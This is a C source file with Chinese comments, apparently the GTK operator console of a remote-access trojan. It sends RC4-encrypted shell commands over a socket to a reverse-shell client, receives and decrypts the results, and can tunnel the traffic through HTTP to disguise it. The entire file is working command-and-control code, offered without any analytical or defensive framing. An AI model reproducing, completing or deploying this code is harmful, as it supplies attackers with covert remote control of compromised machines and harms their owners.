#include "shell.h"

int Send_Command(GtkWidget *widget,gpointer pss)
{
    shell_struct *ss=(shell_struct *)pss;
    char *strbuffer=NULL;
    char SendBuffer[MAX_SIZE],*clear="\0";
    int SendSize=0;

    memset(SendBuffer,NULL,sizeof(SendBuffer));

    strbuffer=(char *)gtk_entry_get_text(GTK_ENTRY(ss->entry));    //获取输入的命令
    strcat(SendBuffer,strbuffer);
    AppendCmdRecord(ss->index,SendBuffer);            //添加到已执行条目中
    strcat(SendBuffer,"\n");

    insert_text(*ss,SendBuffer);
    SendSize=strlen(SendBuffer);
    rc4_crypt(S_box,(unsigned char *)SendBuffer,SendSize);
    if(send(ss->soc,SendBuffer,SendSize,0)<=0)
    {
        puts("命令发送失败.");
        closesocket(ss->soc);
        return -1;
    }
	gtk_entry_set_text(GTK_ENTRY(ss->entry),clear);

    return 0;
}

void Execute_Command(gpointer Parameter)
{
    shell_struct *ss=(shell_struct *)Parameter;
    //printf("命令行反弹\n");
    int i=0,write_len=0,sur_len=0,recv_size=0,ret=0;
    for (i=0; Command_Socket==INVALID_SOCKET && i<10000; i++) Sleep(1);
    if(Command_Socket==INVALID_SOCKET) g_thread_exit(NULL);
    ss->soc=Command_Socket;
    SOCKET soc=ss->soc;
    Command_Socket=INVALID_SOCKET;
    char *http_buffer=NULL,*recv_buffer=NULL;
    char RecvBuffer[MAX_SIZE+1];
    fd_set readfd;
    struct timeval WaitTimeOut;
    int RecvHTTPflag=1;
    int RecvSize=0,recv_buffer_size=0;

    if(!IODataArray[ss->index]->Client.HTTP_Proxy)
    {
        if((recv_buffer=(char *)malloc(sizeof(char)))==NULL)
        {
            MessageBox(NULL,"malloc error!","Error",MB_OK);
            exit(-1);
        }
        recv_buffer[0]=NULL;
    }

    WaitTimeOut.tv_sec=1;
    WaitTimeOut.tv_usec=0;

    while(1)
    {
        FD_ZERO(&readfd);
        FD_SET(soc,&readfd);
        if(select(-1,&readfd,NULL,NULL,&WaitTimeOut)<1)
            continue;
        if(FD_ISSET(soc,&readfd))
        {
            memset(RecvBuffer,NULL,sizeof(RecvBuffer));
            if((recv_size=recv(soc,RecvBuffer,sizeof(RecvBuffer)-1,0))<=0)
            {
                //puts("执行结果接收失败.");
                //MessageBox(NULL,"quit","q",MB_OK);
                if(recv_buffer!=NULL)
                    free(recv_buffer);
				if(http_buffer!=NULL)
					free(http_buffer);
                free(ss);
                g_thread_exit(NULL);
                return;
            }
            if(IODataArray[ss->index]->Client.HTTP_Proxy)
            {
                if((ret=dispose_http_recv(RecvBuffer,&http_buffer,&write_len,&sur_len,recv_size))==1)
                    continue;
                else if(ret==-1)
                {
                    if(http_buffer!=NULL)
                        free(http_buffer);
                    http_buffer=NULL;
                    continue;
                }
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                memcpy(RecvBuffer,http_buffer,write_len);
                free(http_buffer);
                http_buffer=NULL;
            }
            else
            {
                recv_buffer=(char *)realloc(recv_buffer,recv_size+recv_buffer_size);
                if(recv_buffer==NULL)
                {
                    MessageBox(NULL,"realloc error","Error",MB_OK);
                    exit(-1);
                }
                memset(&recv_buffer[recv_buffer_size],NULL,recv_size);
                memcpy(&recv_buffer[recv_buffer_size],RecvBuffer,recv_size);
                recv_buffer_size+=recv_size;
                if(recv_buffer_size>=sizeof(RecvBuffer)-1)
                {
                    memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                    memcpy(RecvBuffer,recv_buffer,sizeof(RecvBuffer)-1);
                    recv_buffer_size-=(sizeof(RecvBuffer)-1);
                    memcpy(recv_buffer,&recv_buffer[sizeof(RecvBuffer)-1],recv_buffer_size);
                    if(recv_buffer_size!=0)
                        recv_buffer=(char *)realloc(recv_buffer,recv_buffer_size);
                }
                else
                    continue;
            }

            rc4_crypt(S_box,(unsigned char *)RecvBuffer,sizeof(RecvBuffer)-1);    //解密命令执行结果
            //AppendCmdResults(ss.index,RecvBuffer);
            gdk_threads_enter();
            insert_text(*ss,RecvBuffer);
            gdk_threads_leave();
            if(IODataArray[ss->index]->Client.HTTP_Proxy)
            {
                //反馈HTTP请求
                if(Send_HTTP_Header(soc,8)!=0)
                {
                    g_thread_exit(NULL);
                    return;
                }
                if(send(soc,"Continue",8,0)<=0)
                {
                    g_thread_exit(NULL);
                    return;
                }
                RecvHTTPflag=1;
            }
        }
    }
    g_thread_exit(NULL);
    return;
}